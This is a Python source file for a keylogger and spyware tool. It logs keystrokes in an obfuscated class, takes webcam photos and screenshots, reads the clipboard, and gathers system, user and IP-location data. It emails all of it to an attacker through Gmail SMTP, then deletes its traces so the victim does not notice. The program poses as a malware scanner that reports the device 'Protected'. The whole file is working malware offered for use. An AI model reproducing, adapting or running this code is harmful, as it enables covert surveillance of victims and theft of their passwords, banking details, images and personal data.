from pynput import keyboard
import time
import threading
import cv2
from PIL import ImageGrab
import pyperclip
import uuid
import platform
import socket
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import os
import requests


# class to log the keys and create a log file with intercepted keystrokes in 
class main_KL :#line:1
    def __init__ (O0O000OOO00O0OO0O ,filename :str ="keystrokes.txt")->None :#line:2
        O0O000OOO00O0OO0O .filename =filename #line:3
    @staticmethod #line:5
    def get_chars (O0O00OO0OO0OO0OOO ):#line:7
        try :#line:8
            return O0O00OO0OO0OO0OOO .char #line:9
        except AttributeError :#line:10
            return str (O0O00OO0OO0OO0OOO )#line:11
    def on_press (O00OO0O00000O00OO ,OO00OOOOO0O00O000 ):#line:14
        with open (O00OO0O00000O00OO .filename ,'a')as OO00OO00OOO000O0O :#line:15
            OO00OO00OOO000O0O .write ("Key Pressed =  \""+O00OO0O00000O00OO .get_chars (OO00OOOOO0O00O000 )+"\"\n")#line:16
    def main (O00O0O000O0OO0000 ):#line:19
        OOOOO00O0O0000O0O =False #line:20
        def OOOOOOOO00O000O00 ():#line:22
            nonlocal OOOOO00O0O0000O0O #line:23
            OOOOO00O0O0000O0O =True #line:24
        O0OO0O00OO0OO0OOO =threading .Timer (5 ,OOOOOOOO00O000O00 )#line:26
        O0OO0O00OO0OO0OOO .start ()#line:27
        OOO000000OO00OO0O =keyboard .Listener (on_press =O00O0O000O0OO0000 .on_press ,)#line:28
        OOO000000OO00OO0O .start ()#line:29
        while not OOOOO00O0O0000O0O and OOO000000OO00OO0O .is_alive ():#line:30
            time .sleep (1 )#line:31
        OOO000000OO00OO0O .stop ()#line:32
        O0OO0O00OO0OO0OOO .cancel ()


# Function to take an image from the webcam
def webcam_image():
    # Gains access to the webcam
    webcam_port = 0
    webcam = cv2.VideoCapture(webcam_port)
    # Waits 0.1 seconds to stop the image being a black screen
    time.sleep(0.1)
    # Saves image to a variable
    return_value, image = webcam.read()
    cv2.imwrite("webcam.png", image)
    # Deletes the variable so that webcam becomes unlocked (decreases chance of detection)
    del webcam


# function to take a screenshot of the victims screen
def take_screenshot():
    # assign the name of the screenshot
    filepath = 'screenshot.png'
    # take screenshot
    screenshot = ImageGrab.grab()
    # save screenshot to a png file
    screenshot.save(filepath, 'PNG')
# function to capture clipboard information (can often be email addresses or bank details potentially)


def clipboard():
    # Read the data from the clipboard
    data = pyperclip.paste()
    # Print the data if not empty
    if data == "":
        return "Clipboard is empty"
    else:
        return "Clipboard content: " + data


# function to gather system information such as operating system, IP and MAC addresses
def system_info():
    # gather platform data
    info = platform.uname()
    # Get private IP address
    ip_address = socket.gethostbyname(socket.gethostname())
    # Get MAC Address and format it correctly
    mac_address = ':'.join(['{:02x}'.format((uuid.getnode() >> ele) & 0xff) for ele in range(0, 8*6, 8)][::-1])
    # Put all data in list
    sys_data = [info[1], info[5], platform.platform(), ip_address, mac_address]
    return sys_data


def get_users():
    # This is creating a list of the users in the directory "\Users" and setting it to filenames
    filenames = os.listdir(path=r"\Users")
    # Removing the default files by looping through them and removing them
    default_files = ["All Users", "Default", "desktop.ini", "Default User"]
    for file in default_files:
        filenames.remove(file)
    # Assigning all the remaining usernames to a string so that it can be returned from the function
    result = ""
    for file in filenames:
        result = result + file + " , "
    return "The Users on this system are: " + result


def get_location_from_public_ip():
    try:
        # Fetch the public IP address of the current device.
        response = requests.get('https://api64.ipify.org?format=json')
        public_ip = response.json()['ip']

        # Use "ip-api.com" API to get location information based on the public IP address.
        url = f"http://ip-api.com/json/{public_ip}"
        response = requests.get(url)
        data = response.json()
        # if a location is found, return the data, otherwise return nothing
        if data['status'] == 'success':
            location_data = {
                "ip": public_ip,
                "city": data.get('city', 'N/A'),
                "region": data.get('regionName', 'N/A'),
                "country": data.get('country', 'N/A'),
                "latitude": data.get('lat', 'N/A'),
                "longitude": data.get('lon', 'N/A')
            }
            return location_data
        else:
            return None
    # print error if function fails
    except Exception as e:
        return f"Error: {e}"


# Class to create and send email
class EmailSender:
    # Initialization function to specify email and password
    def __init__(self, sender, password):
        self.sender = sender
        self.password = password

    # Function that takes data as input and generates the email
    def send_email(self, recipient, subject, message, attachment_path1, attachment_path2, attachment_path3):
        # Create a multipart email object and assign the sender, recipient and subject
        email = MIMEMultipart()
        email['From'] = self.sender
        email['To'] = recipient
        email['Subject'] = subject

        # Attach the message to the email
        email.attach(MIMEText(message, 'plain'))

        attachments = [attachment_path1, attachment_path2, attachment_path3]
        for item in attachments:
            # Open the file in binary mode
            with open(item, 'rb') as attachment:
                # Create a MIMEBase object and set the appropriate MIME type for the attachment
                part = MIMEBase('application', 'octet-stream')
                part.set_payload(attachment.read())
            # Encode the attachment in ASCII characters to send by email
            encoders.encode_base64(part)
            # Add a header to specify the filename of the attachment
            part.add_header('Content-Disposition', f"attachment; filename= {item}")
            # Add the attachment to the email
            email.attach(part)
        # Connect to the gmail SMTP server and send the email
        with smtplib.SMTP('smtp.gmail.com', 587) as server:
            server.starttls()
            server.login(self.sender, self.password)
            server.sendmail(self.sender, recipient, email.as_string())


# run keylogger
if __name__ == "__main__":
    print("Scanning machine for Malware ...")
    # if keystrokes.txt doesn't exist create file
    if not(os.path.exists("keystrokes.txt")):
        f = open("keystrokes.txt", "w")
    # if keylogger.txt does exist just open the file
    else:
        f = open("keystrokes.txt")

    # run other functions to gather data
    webcam_image()
    take_screenshot()
    logger = main_KL()
    logger.main()
    time.sleep(5)

    # gather information for email
    system_data = system_info()
    location_info = get_location_from_public_ip()

    sender_email = "" # enter sender email here
    sender_password = "" # enter gmail code here

    email_sender = EmailSender(sender_email, sender_password)
    recipient_email = "" # Enter recipient here

    email_subject = "Keylogger Data"
    # display the data in a presentable way
    email_message = '''\
    
    The following data was retrieved:
    
    Hostname: {system_data[0]}
    Processor Model: {system_data[1]}
    Operating System: {system_data[2]}
    Private IP Address: {system_data[3]}
    MAC Address: {system_data[4]}
    
    Public IP Address: {location_info[ip]}
    Location: {location_info[city]}, {location_info[region]}, {location_info[country]}
    Latitude: {location_info[latitude]}, Longitude: {location_info[longitude]}
    
    {get_users}
    
    {clipboard}
    \
    '''.format(system_data=system_data, clipboard=clipboard(), get_users=get_users(), location_info=location_info)
    # assign variables to attachments for the email
    keystrokes_file = "keystrokes.txt"
    webcam_file = "webcam.png"
    screenshot_file = "screenshot.png"
    # send the email
    email_sender.send_email(recipient_email, email_subject, email_message, keystrokes_file, webcam_file, screenshot_file)
    # close keystrokes file
    f.close()
    # delete files to avoid victim detecting the keylogger
    os.remove("keystrokes.txt")
    os.remove("screenshot.png")
    os.remove("webcam.png")
    print("Machine Successfully scanned! Your device has been Protected!")

